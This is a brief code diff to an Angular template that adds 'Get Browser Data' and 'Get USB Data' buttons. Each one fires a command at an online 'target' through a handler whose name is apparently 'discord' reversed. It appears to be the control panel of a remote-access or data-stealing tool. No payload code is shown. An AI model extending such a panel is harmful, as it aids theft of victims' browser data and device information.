@@ -77,4 +77,12 @@
       </select>
     </mat-form-field>
   </form>
+  <div>
+    <button mat-button [disabled]="!target$.online" color="accent"
+      (click)="wrocsidHandler('getBrowserData', target$.identifier)">Get Browser Data</button>
+  </div>
+  <div>
+    <button mat-button [disabled]="!target$.online" color="accent"
+      (click)="wrocsidHandler('getUSBData', target$.identifier)">Get USB Data</button>
+  </div>
 </div>
